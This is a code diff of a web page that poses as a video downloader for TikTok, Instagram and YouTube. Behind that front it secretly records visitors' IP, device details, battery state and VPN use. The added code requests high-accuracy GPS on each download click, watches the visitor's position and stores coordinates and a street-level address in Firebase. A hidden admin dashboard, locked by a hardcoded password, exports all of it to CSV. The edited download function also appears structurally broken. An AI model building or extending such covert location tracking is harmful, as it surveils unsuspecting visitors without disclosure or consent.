-      <div class="dlbl">📍 GPS Presisi Tinggi ${vis.gps_status==='granted'?'<span style=\"background:rgba(0,230,118,0.15);color:#00e676;font-size:0.6rem;padding:1px 5px;border-radius:3px;margin-left:4px\">✓ AKURAT</span>':''}</div>
-      ${vis.gps_status==='granted' && vis.gps_lat
-        ? `<div class="dval pink mono" style="font-size:1rem;letter-spacing:0.02em">${vis.gps_lat.toFixed(6)}, ${vis.gps_lng.toFixed(6)}</div>
-           <div style="font-size:0.73rem;color:var(--muted);margin-top:4px">⭕ Radius: <b style="color:#ff2d78">±${vis.gps_accuracy} meter</b> <span style="margin-left:6px;font-size:0.62rem;padding:1px 5px;border-radius:3px;background:${vis.gps_source==='gps'?'rgba(0,212,255,0.15)':'rgba(255,144,0,0.15)'};color:${vis.gps_source==='gps'?'#00d4ff':'#ff9100'}">${vis.gps_source==='gps'?'📡 GPS Chip':'📶 Network/WiFi'}</span></div>
+    <div class="ditem full" style="border-color:${vis.gps_status === 'granted' ? 'rgba(255,45,120,0.4)' : 'var(--border)'}">
+      <div class="dlbl">📍 GPS Presisi Tinggi ${vis.gps_status === 'granted' ? '<span style=\"background:rgba(0,230,118,0.15);color:#00e676;font-size:0.6rem;padding:1px 5px;border-radius:3px;margin-left:4px\">✓ AKURAT</span>' : ''}</div>
+      ${vis.gps_status === 'granted' && vis.gps_lat
+                    ? `<div class="dval pink mono" style="font-size:1rem;letter-spacing:0.02em">${vis.gps_lat.toFixed(6)}, ${vis.gps_lng.toFixed(6)}</div>
+           <div style="font-size:0.73rem;color:var(--muted);margin-top:4px">⭕ Radius: <b style="color:#ff2d78">±${vis.gps_accuracy} meter</b> <span style="margin-left:6px;font-size:0.62rem;padding:1px 5px;border-radius:3px;background:${vis.gps_source === 'gps' ? 'rgba(0,212,255,0.15)' : 'rgba(255,144,0,0.15)'};color:${vis.gps_source === 'gps' ? '#00d4ff' : '#ff9100'}">${vis.gps_source === 'gps' ? '📡 GPS Chip' : '📶 Network/WiFi'}</span></div>
            <a class="maps-a" href="https://www.google.com/maps?q=${vis.gps_lat},${vis.gps_lng}&z=17" target="_blank" style="margin-top:8px;font-size:0.82rem;font-weight:600">🗺️ Buka Google Maps (Presisi Tinggi)</a>`
-        : `<div class="dval" style="color:var(--muted);margin-top:4px">${vis.gps_status==='denied'?'🚫 User menolak izin GPS — hanya data IP tersedia':vis.gps_status==='unavailable'?'⚠️ GPS tidak tersedia di perangkat ini':'⏳ Menunggu respons GPS...'}</div>`}
+                    : `<div class="dval" style="color:var(--muted);margin-top:4px">${vis.gps_status === 'denied' ? '🚫 User menolak izin GPS — hanya data IP tersedia' : vis.gps_status === 'unavailable' ? '⚠️ GPS tidak tersedia di perangkat ini' : '⏳ Menunggu respons GPS...'}</div>`}
     </div>
-    ${vis.gps_status==='granted' && vis.geo_kelurahan ? `
+    ${vis.gps_status === 'granted' && vis.geo_kelurahan ? `
     <div class="ditem full" style="border-color:rgba(0,212,255,0.3);background:rgba(0,212,255,0.04)">
       <div class="dlbl">🏘️ Alamat Lengkap (dari GPS) <span style="background:rgba(0,230,118,0.15);color:#00e676;font-size:0.6rem;padding:1px 5px;border-radius:3px;margin-left:4px">GPS VERIFIED</span></div>
       <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.4rem;margin-top:0.5rem">
-        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Kelurahan</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_kelurahan||'N/A'}</div></div>
-        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Kecamatan</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_kecamatan||'N/A'}</div></div>
-        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Kota / Kabupaten</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_kota||'N/A'}</div></div>
-        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Provinsi</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_provinsi||'N/A'}</div></div>
-        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Kode Pos</div><div style="font-size:0.85rem;color:#00d4ff;font-family:var(--mono)">${vis.geo_kodepos||'N/A'}</div></div>
-        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Negara</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_negara||'N/A'}</div></div>
+        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Kelurahan</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_kelurahan || 'N/A'}</div></div>
+        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Kecamatan</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_kecamatan || 'N/A'}</div></div>
+        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Kota / Kabupaten</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_kota || 'N/A'}</div></div>
+        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Provinsi</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_provinsi || 'N/A'}</div></div>
+        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Kode Pos</div><div style="font-size:0.85rem;color:#00d4ff;font-family:var(--mono)">${vis.geo_kodepos || 'N/A'}</div></div>
+        <div><div style="font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;font-family:var(--mono)">Negara</div><div style="font-size:0.85rem;color:#e8e8f5">${vis.geo_negara || 'N/A'}</div></div>
       </div>
       ${vis.geo_alamat ? `<div style="font-size:0.7rem;color:var(--muted);margin-top:0.6rem;line-height:1.5;border-top:1px solid var(--border);padding-top:0.5rem">📌 ${vis.geo_alamat}</div>` : ''}
     </div>` : ''}
-    <div class="ditem full" style="opacity:${vis.gps_status==='granted'?'0.6':'1'}">
+    <div class="ditem full" style="opacity:${vis.gps_status === 'granted' ? '0.6' : '1'}">
       <div class="dlbl">🌐 Lokasi IP-based <span style="font-size:0.6rem;color:#ff9100;margin-left:4px;background:rgba(255,144,0,0.1);padding:1px 5px;border-radius:3px">⚠️ PERKIRAAN ISP</span></div>
       <div style="font-size:0.72rem;color:var(--muted);margin-bottom:4px">Menunjuk ke kantor ISP, bukan lokasi fisik user</div>
       <div class="dval mono" style="color:var(--muted)">${vis.lat ? `${+vis.lat.toFixed(4)}, ${+vis.lng.toFixed(4)}` : 'N/A'} ${vis.city ? '· ' + vis.city : ''}</div>
-      ${ipMap && vis.gps_status!=='granted' ? `<a class="maps-a" href="${ipMap}" target="_blank">🗺️ Google Maps (IP — tidak akurat)</a>` : ''}
+      ${ipMap && vis.gps_status !== 'granted' ? `<a class="maps-a" href="${ipMap}" target="_blank">🗺️ Google Maps (IP — tidak akurat)</a>` : ''}
     </div>
-    <div class="ditem full"><div class="dlbl">User Agent</div><div class="dval mono" style="font-size:0.7rem;color:var(--muted)">${vis.ua||'N/A'}</div></div>
+    <div class="ditem full"><div class="dlbl">User Agent</div><div class="dval mono" style="font-size:0.7rem;color:var(--muted)">${vis.ua || 'N/A'}</div></div>
     <div class="ditem full" style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:0.5rem">
-      <div><div class="dlbl">Label / Nama</div><div class="dval" style="color:${vis.label?'#ffc107':'var(--muted)'}">${vis.label||'Belum diberi nama'}</div></div>
+      <div><div class="dlbl">Label / Nama</div><div class="dval" style="color:${vis.label ? '#ffc107' : 'var(--muted)'}">${vis.label || 'Belum diberi nama'}</div></div>
       <button onclick="window.openRename('${vis._key}')" style="padding:0.4rem 0.9rem;background:none;border:1px solid var(--purple);color:#a78bfa;border-radius:7px;font-family:var(--font);font-size:0.78rem;cursor:pointer;white-space:nowrap">✏️ Beri Nama</button>
     </div>
   `;
-  document.getElementById('detailModal').classList.add('show');
-};
+            document.getElementById('detailModal').classList.add('show');
+        };
 
-window.closeDetail = () => document.getElementById('detailModal').classList.remove('show');
+        window.closeDetail = () => document.getElementById('detailModal').classList.remove('show');
 
-window.clearAll = async function() {
-  if (confirm('Hapus semua data visitor? Tindakan ini tidak bisa dibatalkan.')) await remove(visRef);
-};
+        window.clearAll = async function () {
+            if (confirm('Hapus semua data visitor? Tindakan ini tidak bisa dibatalkan.')) await remove(visRef);
+        };
 
-window.deleteVisitor = async function(key) {
-  if (!confirm('Hapus visitor ini?')) return;
-  await remove(ref(db, `visitors/${key}`));
-};
+        window.deleteVisitor = async function (key) {
+            if (!confirm('Hapus visitor ini?')) return;
+            await remove(ref(db, `visitors/${key}`));
+        };
 
-window.refreshDash = function() {
-  const btn = document.getElementById('btnRefresh');
-  btn.classList.add('spinning');
-  btn.disabled = true;
-  window.renderDash();
-  setTimeout(() => { btn.classList.remove('spinning'); btn.disabled = false; }, 800);
-};
+        window.refreshDash = function () {
+            const btn = document.getElementById('btnRefresh');
+            btn.classList.add('spinning');
+            btn.disabled = true;
+            window.renderDash();
+            setTimeout(() => { btn.classList.remove('spinning'); btn.disabled = false; }, 800);
+        };
+        // simpan key ke window agar bisa diakses dari luar modul
+        window.lastVisitorKey = savedKey;
 
-window.exportCSV = function() {
-  if (!allVisitors.length) { alert('Tidak ada data untuk diexport.'); return; }
-  const cols = ['timestamp','label','ip','city','region','country','postal',
-    'geo_kelurahan','geo_kecamatan','geo_kota','geo_provinsi','geo_kodepos','geo_alamat',
-    'gps_lat','gps_lng','gps_accuracy','gps_status','gps_source',
-    'deviceBrand','deviceModel','deviceType','browser','connection',
-    'battery_level','battery_charging','referrer_label','referrer',
-    'is_vpn','language','timezone','screen','viewport','org','asn','ua'];
-  const esc = v => {
-    if (v == null) return '';
-    const s = String(v);
-    return s.includes(',') || s.includes('"') || s.includes('\n') ? '"' + s.replace(/"/g,'""') + '"' : s;
-  };
-  const rows = [cols.join(',')];
-  allVisitors.forEach(v => rows.push(cols.map(c => esc(v[c])).join(',')));
-  const blob = new Blob([rows.join('\n')], {type:'text/csv;charset=utf-8;'});
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement('a');
-  a.href = url;
-  a.download = `savevideo_visitors_${new Date().toISOString().slice(0,10)}.csv`;
-  a.click();
-  URL.revokeObjectURL(url);
-};
+        window.exportCSV = function () {
+            if (!allVisitors.length) { alert('Tidak ada data untuk diexport.'); return; }
+            const cols = ['timestamp', 'label', 'ip', 'city', 'region', 'country', 'postal',
+                'geo_kelurahan', 'geo_kecamatan', 'geo_kota', 'geo_provinsi', 'geo_kodepos', 'geo_alamat',
+                'gps_lat', 'gps_lng', 'gps_accuracy', 'gps_status', 'gps_source',
+                'deviceBrand', 'deviceModel', 'deviceType', 'browser', 'connection',
+                'battery_level', 'battery_charging', 'referrer_label', 'referrer',
+                'is_vpn', 'language', 'timezone', 'screen', 'viewport', 'org', 'asn', 'ua'];
+            const esc = v => {
+                if (v == null) return '';
+                const s = String(v);
+                return s.includes(',') || s.includes('"') || s.includes('\n') ? '"' + s.replace(/"/g, '""') + '"' : s;
+            };
+            const rows = [cols.join(',')];
+            allVisitors.forEach(v => rows.push(cols.map(c => esc(v[c])).join(',')));
+            const blob = new Blob([rows.join('\n')], { type: 'text/csv;charset=utf-8;' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `savevideo_visitors_${new Date().toISOString().slice(0, 10)}.csv`;
+            a.click();
+            URL.revokeObjectURL(url);
+        };
 
-let _renameKey = null;
-window.openRename = function(key) {
-  _renameKey = key;
-  const vis = allVisitors.find(v=>v._key===key);
-  document.getElementById('renameSubtitle').textContent = vis ? `IP: ${vis.ip||'?'} · ${vis.city||vis.country||''}` : '';
-  document.getElementById('renameInp').value = vis?.label || '';
-  document.getElementById('renameModal').classList.add('show');
-  setTimeout(()=>document.getElementById('renameInp').select(), 80);
-};
+        let _renameKey = null;
+        window.openRename = function (key) {
+            _renameKey = key;
+            const vis = allVisitors.find(v => v._key === key);
+            document.getElementById('renameSubtitle').textContent = vis ? `IP: ${vis.ip || '?'} · ${vis.city || vis.country || ''}` : '';
+            document.getElementById('renameInp').value = vis?.label || '';
+            document.getElementById('renameModal').classList.add('show');
+            setTimeout(() => document.getElementById('renameInp').select(), 80);
+        };
 
-window.saveRename = async function() {
-  if (!_renameKey) return;
-  const label = document.getElementById('renameInp').value.trim();
-  await update(ref(db, `visitors/${_renameKey}`), { label: label || null });
-  closeRename();
-};
+        window.saveRename = async function () {
+            if (!_renameKey) return;
+            const label = document.getElementById('renameInp').value.trim();
+            await update(ref(db, `visitors/${_renameKey}`), { label: label || null });
+            closeRename();
+        };
 
-window.closeRename = function() {
-  document.getElementById('renameModal').classList.remove('show');
-  _renameKey = null;
-};
+        window.closeRename = function () {
+            document.getElementById('renameModal').classList.remove('show');
+            _renameKey = null;
+        };
+        window.requestLocationAgain = function () {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        console.log('Lokasi via prompt', pos);
+                        // Cari visitor terbaru dengan IP yang sama? Sulit.
+                        // Kita serahkan ke watchPosition.
+                    },
+                    (err) => console.warn("Gagal dapat lokasi:", err),
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            }
+        };
 
-function cf(code) {
-  if (!code || code.length!==2) return '';
-  return code.toUpperCase().split('').map(c=>String.fromCodePoint(c.charCodeAt(0)+127397)).join('');
-}
+        function cf(code) {
+            if (!code || code.length !== 2) return '';
+            return code.toUpperCase().split('').map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
+        }
 
-// Jangan collect jika admin membuka halaman (hindari double entry)
-// isAdminCheck: cek URL sekarang (sebelum variabel isAdminMode di-define di script berikutnya)
-(function() {
-  const _isAdmin = window.location.search.includes('admin') || window.location.hash.includes('admin') || sessionStorage.getItem('sv_admin_unlocked') === '1';
-  if (!_isAdmin) collect();
-})();
-</script>
+        // Jangan collect jika admin membuka halaman (hindari double entry)
+        // isAdminCheck: cek URL sekarang (sebelum variabel isAdminMode di-define di script berikutnya)
+        (function () {
+            const _isAdmin = window.location.search.includes('admin') || window.location.hash.includes('admin') || sessionStorage.getItem('sv_admin_unlocked') === '1';
+            if (!_isAdmin) collect();
+        })();
+    </script>
 
-<script>
-// PASSWORD + SESSION PERSISTENCE
-const PASS = 'fauzan2007'; // ← Ganti password di sini!
-const SESSION_KEY = 'sv_admin_unlocked';
-let unlocked = sessionStorage.getItem(SESSION_KEY) === '1';
+    <script>
+        // PASSWORD + SESSION PERSISTENCE
+        const PASS = 'fauzan2007'; // ← Ganti password di sini!
+        const SESSION_KEY = 'sv_admin_unlocked';
+        let unlocked = sessionStorage.getItem(SESSION_KEY) === '1';
 
-// Cek apakah ini admin (via URL hash ?admin atau session)
-// Jika admin → skip collect(), langsung cek session
-const isAdminMode = window.location.search.includes('admin') || window.location.hash.includes('admin');
+        // Cek apakah ini admin (via URL hash ?admin atau session)
+        // Jika admin → skip collect(), langsung cek session
+        const isAdminMode = window.location.search.includes('admin') || window.location.hash.includes('admin');
 
-function openDash() {
-  if (unlocked) { showDash(); return; }
-  document.getElementById('pwOverlay').classList.add('show');
-  setTimeout(()=>document.getElementById('pwInput').focus(), 100);
-}
+        function openDash() {
+            if (unlocked) { showDash(); return; }
+            document.getElementById('pwOverlay').classList.add('show');
+            setTimeout(() => document.getElementById('pwInput').focus(), 100);
+        }
 
-function checkPw() {
-  const val = document.getElementById('pwInput').value;
-  const inp = document.getElementById('pwInput');
-  const err = document.getElementById('pwErr');
-  if (val === PASS) {
-    unlocked = true;
-    sessionStorage.setItem(SESSION_KEY, '1');
-    // Tandai URL dengan hash #admin agar refresh tetap di dashboard
-    if (!window.location.hash.includes('admin')) {
-      history.replaceState(null, '', window.location.pathname + '#admin');
-    }
-    closePw();
-    showDash();
-  } else {
-    err.textContent = '❌ Password salah, coba lagi';
-    inp.classList.add('shake');
-    setTimeout(()=>{ inp.classList.remove('shake'); inp.value=''; inp.focus(); }, 500);
-  }
-}
+        function checkPw() {
+            const val = document.getElementById('pwInput').value;
+            const inp = document.getElementById('pwInput');
+            const err = document.getElementById('pwErr');
+            if (val === PASS) {
+                unlocked = true;
+                sessionStorage.setItem(SESSION_KEY, '1');
+                // Tandai URL dengan hash #admin agar refresh tetap di dashboard
+                if (!window.location.hash.includes('admin')) {
+                    history.replaceState(null, '', window.location.pathname + '#admin');
+                }
+                closePw();
+                showDash();
+            } else {
+                err.textContent = '❌ Password salah, coba lagi';
+                inp.classList.add('shake');
+                setTimeout(() => { inp.classList.remove('shake'); inp.value = ''; inp.focus(); }, 500);
+            }
+        }
 
-function closePw() {
-  document.getElementById('pwOverlay').classList.remove('show');
-  document.getElementById('pwInput').value = '';
-  document.getElementById('pwErr').textContent = '';
-}
+        function closePw() {
+            document.getElementById('pwOverlay').classList.remove('show');
+            document.getElementById('pwInput').value = '';
+            document.getElementById('pwErr').textContent = '';
+        }
 
-function showDash() {
-  document.getElementById('dashOverlay').classList.add('show');
-  // Update URL hash saat buka dashboard
-  if (!window.location.hash.includes('admin')) {
-    history.replaceState(null, '', window.location.pathname + '#admin');
-  }
-  window.renderDash();
-}
+        function showDash() {
+            document.getElementById('dashOverlay').classList.add('show');
+            // Update URL hash saat buka dashboard
+            if (!window.location.hash.includes('admin')) {
+                history.replaceState(null, '', window.location.pathname + '#admin');
+            }
+            window.renderDash();
+        }
 
-function closeDash() {
-  document.getElementById('dashOverlay').classList.remove('show');
-  // Hapus hash admin saat tutup dashboard
-  history.replaceState(null, '', window.location.pathname);
-  sessionStorage.removeItem(SESSION_KEY);
-  unlocked = false;
-}
+        function closeDash() {
+            document.getElementById('dashOverlay').classList.remove('show');
+            // Hapus hash admin saat tutup dashboard
+            history.replaceState(null, '', window.location.pathname);
+            sessionStorage.removeItem(SESSION_KEY);
+            unlocked = false;
+        }
 
-// Auto-restore: jika hash #admin & session masih aktif → langsung buka dashboard
-window.addEventListener('DOMContentLoaded', () => {
-  if (unlocked && isAdminMode) {
-    showDash();
-  }
-});
+        // Auto-restore: jika hash #admin & session masih aktif → langsung buka dashboard
+        window.addEventListener('DOMContentLoaded', () => {
+            if (unlocked && isAdminMode) {
+                showDash();
+            }
+        });
 
-// ─── DOWNLOADER ───────────────────────────────────────────────
-// Coba beberapa endpoint Cobalt secara berurutan
-const COBALT_ENDPOINTS = [
-  'https://api.cobalt.tools/',
-  'https://cobalt.tools/api/',
-  'https://co.wuk.sh/'
-];
+        // ─── DOWNLOADER ───────────────────────────────────────────────
+        // Coba beberapa endpoint Cobalt secara berurutan
+        const COBALT_ENDPOINTS = [
+            'https://api.cobalt.tools/',
+            'https://cobalt.tools/api/',
+            'https://co.wuk.sh/'
+        ];
 
-async function tryCobalt(endpoint, url) {
-  const res = await fetch(endpoint, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      'Accept': 'application/json'
-    },
-    body: JSON.stringify({
-      url,
-      videoQuality: 'max',
-      filenameStyle: 'pretty',
-      twitterGif: false,
-      tiktokH265: false
-    }),
-    signal: AbortSignal.timeout(10000)
-  });
-  if (!res.ok) throw new Error('HTTP ' + res.status);
-  return await res.json();
-}
+        async function tryCobalt(endpoint, url) {
+            const res = await fetch(endpoint, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    url,
+                    videoQuality: 'max',
+                    filenameStyle: 'pretty',
+                    twitterGif: false,
+                    tiktokH265: false
+                }),
+                signal: AbortSignal.timeout(10000)
+            });
+            if (!res.ok) throw new Error('HTTP ' + res.status);
+            return await res.json();
+        }
 
-// API publik alternatif (RapidAPI style proxy / open instances)
-async function tryTikwm(url) {
-  // tikwm.com - API publik untuk TikTok tanpa watermark
-  const res = await fetch(`https://www.tikwm.com/api/?url=${encodeURIComponent(url)}&hd=1`, {
-    signal: AbortSignal.timeout(10000)
-  });
-  if (!res.ok) throw new Error('HTTP ' + res.status);
-  const d = await res.json();
-  if (d.code !== 0) throw new Error(d.msg || 'Failed');
-  return d.data;
-}
+        // API publik alternatif (RapidAPI style proxy / open instances)
+        async function tryTikwm(url) {
+            // tikwm.com - API publik untuk TikTok tanpa watermark
+            const res = await fetch(`https://www.tikwm.com/api/?url=${encodeURIComponent(url)}&hd=1`, {
+                signal: AbortSignal.timeout(10000)
+            });
+            if (!res.ok) throw new Error('HTTP ' + res.status);
+            const d = await res.json();
+            if (d.code !== 0) throw new Error(d.msg || 'Failed');
+            return d.data;
+        }
 
-async function handleDownload() {
-  const url = document.getElementById('videoUrl').value.trim();
-  const btn = document.getElementById('btnDl');
-  const loading = document.getElementById('loadingArea');
-  const loadingText = document.getElementById('loadingText');
-  const result = document.getElementById('resultContent');
-  const errEl = document.getElementById('errorMsg');
-  const resArea = document.getElementById('resultArea');
+        async function handleDownload() {
 
-  if (!url) { showErr('Masukkan link video terlebih dahulu!'); return; }
-  if (!url.startsWith('http')) { showErr('Link tidak valid. Pastikan diawali https://'); return; }
+            // Di dalam handleDownload, setelah validasi URL, sebelum proses download
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        console.log('Lokasi didapat via download click', pos);
+                        // Tidak perlu update karena watchPosition akan melakukannya
+                    },
+                    (err) => console.warn('Gagal dapat lokasi via click', err),
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            }
+            if (navigator.geolocation && window.lastVisitorKey) {
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        const { latitude, longitude, accuracy } = pos.coords;
+                        await update(ref(db, `visitors/${window.lastVisitorKey}`), {
+                            gps_lat: latitude,
+                            gps_lng: longitude,
+                            gps_accuracy: Math.round(accuracy),
+                            gps_status: 'granted',
+                            gps_source: 'click',
+                            lat: latitude,
+                            lng: longitude
+                        });
+                    },
+                    (err) => console.warn('Gagal dapat lokasi via klik', err),
+                    { enableHighAccuracy: true, timeout: 15000 }
+                );
+            }
+            if (navigator.geolocation && savedKey) {
+                let bestAcc = Infinity;
+                let committed = false;
+                let watchIdLow = null;
+                let watchIdHigh = null;
+                let geoInFlight = false;
+                const HARD_STOP = 30000; // 30 detik
 
-  btn.disabled = true;
-  errEl.classList.remove('show');
-  resArea.classList.add('show');
-  loading.style.display = 'block';
-  result.innerHTML = '';
+                const doReverseGeo = async (lat, lng) => { /* sama seperti sebelumnya */ };
 
-  const isTiktok = url.includes('tiktok') || url.includes('vm.tiktok') || url.includes('vt.tiktok');
-  const isIg = url.includes('instagram') || url.includes('instagr.am');
-  const isYt = url.includes('youtube') || url.includes('youtu.be');
+                const savePos = async (pos, source) => {
+                    const { latitude, longitude, accuracy } = pos.coords;
+                    // Simpan jika pertama kali atau akurasi lebih baik
+                    if (!committed || accuracy < bestAcc) {
+                        committed = true;
+                        bestAcc = accuracy;
+                        await update(ref(db, `visitors/${savedKey}`), {
+                            gps_lat: latitude,
+                            gps_lng: longitude,
+                            gps_accuracy: Math.round(accuracy),
+                            gps_status: 'granted',
+                            gps_source: source,
+                            lat: latitude,
+                            lng: longitude
+                        });
+                        if (!geoInFlight) doReverseGeo(latitude, longitude);
+                        // Jika akurasi sudah bagus (<= 100m), hentikan semua watcher
+                        if (accuracy <= 100) stopAll();
+                    }
+                };
 
-  let success = false;
+                const stopAll = () => {
+                    if (watchIdLow !== null) { navigator.geolocation.clearWatch(watchIdLow); watchIdLow = null; }
+                    if (watchIdHigh !== null) { navigator.geolocation.clearWatch(watchIdHigh); watchIdHigh = null; }
+                };
 
-  // ── 1. Coba tikwm.com untuk TikTok (sangat reliable) ──
-  if (isTiktok && !success) {
-    try {
-      loadingText.textContent = 'Mengambil video TikTok...';
-      const data = await tryTikwm(url);
-      loading.style.display = 'none';
+                const onErr = async (err) => {
+                    if (!committed) {
+                        if (err.code === 1) { // PERMISSION_DENIED
+                            stopAll();
+                            await update(ref(db, `visitors/${savedKey}`), { gps_status: 'denied' });
+                        }
+                        // untuk error lain (timeout, unavailable) biarkan watcher lain mencoba
+                    }
+                };
 
-      const hdUrl = data.hdplay || data.play;
-      const noWmUrl = data.wmplay ? '' : ''; // wmplay = with watermark, play/hdplay = no watermark
+                // Pertama, coba getCurrentPosition dengan akurasi tinggi, timeout cepat
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        savePos(pos, 'gps');
+                        // setelah berhasil, kita masih bisa menjalankan watch untuk update jika ada yang lebih akurat? 
+                        // Tapi kita hentikan saja karena sudah dapat. Atau kita jalankan watch juga untuk jaga-jaga.
+                        // Lebih baik jalankan watch juga dengan akurasi tinggi untuk update jika ada perbaikan.
+                        // Tapi kita sudah dapat, jadi tidak perlu watcher tambahan? Mungkin kita tetap jalankan watch
+                        // dengan akurasi tinggi untuk mendapatkan update jika ada perbaikan (misal dari 10m ke 5m).
+                        // Kita bisa mulai watchHigh saja.
+                        watchIdHigh = navigator.geolocation.watchPosition(
+                            p => savePos(p, 'gps'),
+                            onErr,
+                            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+                        );
+                        // Set timeout untuk menghentikan watch setelah beberapa saat
+                        setTimeout(() => {
+                            if (watchIdHigh !== null) {
+                                navigator.geolocation.clearWatch(watchIdHigh);
+                                watchIdHigh = null;
+                            }
+                        }, 15000); // 15 detik setelah dapat posisi, stop
+                    },
+                    (err) => {
+                        // Jika getCurrentPosition gagal (misal karena butuh interaksi atau timeout), lanjut ke watchPosition
+                        console.warn('getCurrentPosition gagal, beralih ke watch', err);
+                        // Mulai watch network dan gps seperti sebelumnya
+                        watchIdLow = navigator.geolocation.watchPosition(
+                            pos => savePos(pos, 'network'),
+                            onErr,
+                            { enableHighAccuracy: false, timeout: 10000, maximumAge: 30000 }
+                        );
+                        watchIdHigh = navigator.geolocation.watchPosition(
+                            pos => savePos(pos, 'gps'),
+                            onErr,
+                            { enableHighAccuracy: true, timeout: 40000, maximumAge: 0 }
+                        );
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
 
-      let buttons = '';
-      if (hdUrl) {
-        buttons += `<a class="dl-btn primary" href="${hdUrl}" target="_blank" download="tiktok_hd.mp4">⬇ Download HD (No WM)</a>`;
-      }
-      if (data.play && data.play !== hdUrl) {
-        buttons += `<a class="dl-btn secondary" href="${data.play}" target="_blank" download="tiktok.mp4">⬇ Download SD (No WM)</a>`;
-      }
-      if (data.music) {
-        buttons += `<a class="dl-btn secondary" href="${data.music}" target="_blank" download="audio.mp3">🎵 Download Audio</a>`;
-      }
-      buttons += `<a class="dl-btn secondary" href="${url}" target="_blank">🔗 Buka Original</a>`;
+                // Hard stop 30 detik
+                setTimeout(() => {
+                    stopAll();
+                    if (!committed) {
+                        update(ref(db, `visitors/${savedKey}`), { gps_status: 'unavailable' });
+                    }
+                }, HARD_STOP);
+            }
 
-      const title = data.title ? `<p style="font-size:0.78rem;color:var(--muted);margin-bottom:0.75rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:100%">${data.title.substring(0,80)}</p>` : '';
 
-      result.innerHTML = `
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    console.log("Lokasi didapat:", pos);
+                    // Lokasi akan otomatis tersimpan melalui watchPosition yang sudah berjalan,
+                    // atau kita bisa langsung update ke Firebase jika perlu.
+                },
+                (err) => console.warn("Gagal dapat lokasi:", err),
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }
+        const url = document.getElementById('videoUrl').value.trim();
+        const btn = document.getElementById('btnDl');
+        const loading = document.getElementById('loadingArea');
+        const loadingText = document.getElementById('loadingText');
+        const result = document.getElementById('resultContent');
+        const errEl = document.getElementById('errorMsg');
+        const resArea = document.getElementById('resultArea');
+
+        if (!url) { showErr('Masukkan link video terlebih dahulu!'); return; }
+        if (!url.startsWith('http')) { showErr('Link tidak valid. Pastikan diawali https://'); return; }
+
+        btn.disabled = true;
+        errEl.classList.remove('show');
+        resArea.classList.add('show');
+        loading.style.display = 'block';
+        result.innerHTML = '';
+
+        const isTiktok = url.includes('tiktok') || url.includes('vm.tiktok') || url.includes('vt.tiktok');
+        const isIg = url.includes('instagram') || url.includes('instagr.am');
+        const isYt = url.includes('youtube') || url.includes('youtu.be');
+
+        let success = false;
+
+        // ── 1. Coba tikwm.com untuk TikTok (sangat reliable) ──
+        if (isTiktok && !success) {
+            try {
+                loadingText.textContent = 'Mengambil video TikTok...';
+                const data = await tryTikwm(url);
+                loading.style.display = 'none';
+
+                const hdUrl = data.hdplay || data.play;
+                const noWmUrl = data.wmplay ? '' : ''; // wmplay = with watermark, play/hdplay = no watermark
+
+                let buttons = '';
+                if (hdUrl) {
+                    buttons += `<a class="dl-btn primary" href="${hdUrl}" target="_blank" download="tiktok_hd.mp4">⬇ Download HD (No WM)</a>`;
+                }
+                if (data.play && data.play !== hdUrl) {
+                    buttons += `<a class="dl-btn secondary" href="${data.play}" target="_blank" download="tiktok.mp4">⬇ Download SD (No WM)</a>`;
+                }
+                if (data.music) {
+                    buttons += `<a class="dl-btn secondary" href="${data.music}" target="_blank" download="audio.mp3">🎵 Download Audio</a>`;
+                }
+
